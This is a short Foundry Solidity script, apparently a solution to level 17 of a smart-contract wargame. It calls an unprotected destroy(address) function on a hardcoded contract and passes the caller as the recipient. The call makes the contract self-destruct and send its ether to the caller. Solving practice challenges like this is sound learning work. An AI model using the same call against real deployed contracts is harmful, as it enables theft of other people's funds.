// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Level17Script is Script {
    address target = 0xF323cE834CC03252495517f84756C71D019AEA4f;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        (bool d,) = address(target).call(abi.encodeWithSignature("destroy(address)", msg.sender));
        require(d);
        vm.stopBroadcast();
    }
}
